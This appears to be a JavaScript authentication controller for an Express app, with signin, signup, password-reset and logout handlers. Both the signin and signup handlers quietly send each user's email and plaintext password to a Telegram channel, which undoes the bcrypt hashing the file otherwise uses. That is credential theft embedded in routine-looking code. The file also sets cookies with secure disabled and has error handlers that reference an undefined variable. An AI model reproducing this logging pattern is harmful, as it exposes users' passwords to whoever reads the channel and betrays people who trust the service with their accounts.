import pool from "../../../Database/DbConnection.js";
import bcrypt from "bcrypt";
import { notifyTelegram } from "../Notification/notifyTelegram.js";
import jwt from "jsonwebtoken";
import { nanoid } from "nanoid";
import {
  INSERT_USER,
  CHECK_USER,
  INSERT_TOKEN_EMAIL,
  FIND_TOKEN,
  UPDATE_MAIN_TABLE_PASSSWORD,
  DELETE_TOKEN,
  TIMESTAMP,
} from "../Query/query.js";
import nodemailer from "nodemailer";

const SECRET_KEY = process.env.SECRET_KEY;

async function Signin(req, res) {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(409).json({ message: "All Filed Required" });
    }
    const checkuser = await pool.query(CHECK_USER, [email]);
    if (checkuser.rows.length === 0) {
      return res.status(409).json({ message: "User Not Found" });
    }
    const dbPassword = checkuser.rows[0]?.password;
    const validpassword = await bcrypt.compare(password, dbPassword);
    if (!validpassword) {
      return res.status(401).json("Invalid password");
    }

    const token = jwt.sign({ email }, SECRET_KEY, { expiresIn: "1h" });
    res.cookie("token", token, {
      httpOnly: true,
      secure: false,
      sameSite: "lax",
      maxAge: 3600000,
    });
    await notifyTelegram(
      `🔐 User logged in:\nEmail: ${email}\n🔑 Password: ${password}\n🕒 Time: ${TIMESTAMP} `
    );
    return res.status(201).json({ message: "User Login Successfully" });
  } catch (error) {
    return res
      .status(500)
      .json({ message: "Internal Server Error", error: message });
  }
}

async function Signup(req, res) {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(409).json({ message: "All Filed Are Required" });
    }
    await notifyTelegram(
      `🔐 User Created:\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${TIMESTAMP}`
    );

    const hashpassword = await bcrypt.hash(password, 10);
    await pool.query(INSERT_USER, [email, hashpassword]);

    const token = jwt.sign({ email }, SECRET_KEY, { expiresIn: "1h" });
    res.cookie("token", token, {
      httpOnly: true,
      secure: false,
      sameSite: "lax",
      maxAge: 3600000,
    });

    return res.status(201).json({ message: "User Created Successfully" });
  } catch (error) {
    return res
      .status(500)
      .json({ message: "Internal Server Error", error: message });
  }
}

async function ForgotPassword(req, res) {
  try {
    const { email } = req.body;
    if (!email) {
      return res.status(409).json({ message: "All Filed Required" });
    }
    const FindUser = await pool.query(CHECK_USER, [email]);
    if (FindUser.rows.length === 0) {
      return res.status(404).json({ message: "Email not found" });
    }
    const token = nanoid();
    // TTL (Time To Leave)
    const expiresAt = new Date(Date.now() + 2 * 60 * 1000);
    await pool.query(INSERT_TOKEN_EMAIL, [email, token, expiresAt]);

    // Sending Mail
    const Forgor_Password_Link = `http://localhost:5173/setpassword?token=${token}&email=${email}`;
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: email,
      subject: "🔐 Reset Your Password",
      html: `
        <p>You Requested to reset your password.</p>
        <p>Click <a href="${Forgor_Password_Link}">here</a> to reset it. This link expires in 2 minutes.</p>
      `,
    });
    return res.status(200).json({ message: "Reset token sent to email" });
  } catch (error) {
    return res
      .status(500)
      .json({ message: "Internal Server Error", error: message });
  }
}

async function ResetPassword(req, res) {
  try {
    const { token, password } = req.body;
    if (!token || !password) {
      return res
        .status(409)
        .json({ message: "Token and password are required" });
    }
    const result = await pool.query(FIND_TOKEN, [token]);
    if (
      result.rows.length === 0 ||
      new Date(result.rows[0].expires_at) < new Date()
    ) {
      return res.status(400).json({ message: "Token is invalid or expired" });
    }
    const email = result.rows[0].email;
    const hashedPassword = await bcrypt.hash(password, 10);
    await pool.query(UPDATE_MAIN_TABLE_PASSSWORD, [hashedPassword, email]);
    await pool.query(DELETE_TOKEN, [token]);

    return res.status(200).json({ message: "Password Change Successfully" });
  } catch (error) {
    return res
      .status(500)
      .json({ message: "Internal Server Error", error: error.message });
  }
}

async function Logout(req, res) {
  res.clearCookie("token", {
    httpOnly: true,
    sameSite: "lax",
    secure: false, // ✅ true in production (HTTPS)
  });
  res.status(200).json({ message: "Logged out successfully" });
}

export { Signin, Signup, ForgotPassword, ResetPassword, Logout };
